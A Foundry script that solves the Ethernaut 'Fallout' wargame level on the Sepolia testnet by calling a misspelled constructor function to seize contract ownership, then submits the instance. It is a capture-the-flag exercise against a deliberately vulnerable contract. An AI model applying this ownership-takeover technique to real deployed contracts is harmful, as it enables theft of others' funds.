// SPDX-License-Identifier: MIT

pragma experimental ABIEncoderV2;
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {ILevel} from "../../src/interfaces/ILevel.sol";
import {Fallout} from "ethernaut/contracts/src/levels/Fallout.sol";
import {Helpers} from "../Helpers.s.sol";

contract FalloutSolution is Script, Helpers {
    uint pvtKey;
    address myAddr;
    uint myBalance;
    address deployedInstanceByEthernaut;

    function run() external {
        pvtKey = vm.envUint("METAMASK_PRIVATE_KEY");
        myAddr = vm.addr(pvtKey);
        myBalance = myAddr.balance;
        console.log("My Address:",myAddr);
        console.log("My Balance:",myBalance);

        ILevel level = ILevel(0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639); // the supplied address is of factory contract on sepolia eth
        
        vm.startBroadcast(pvtKey);
        
        deployedInstanceByEthernaut = createInstance(myAddr, level);
        Fallout falloutInstance = Fallout(payable(deployedInstanceByEthernaut));


        // solving the chall
        console.log("Owner before triggering misspelled constructor:", falloutInstance.owner());
        falloutInstance.Fal1out(); // in older solidity (~0.6.0) the contract name was used as function name for it to be considered a constructor
        console.log("Owner after triggering misspelled constructor:", falloutInstance.owner());
        

        // submitting on ethernaut
        submitInstance(deployedInstanceByEthernaut);

        getStats(myAddr);

        vm.stopBroadcast();
    }
}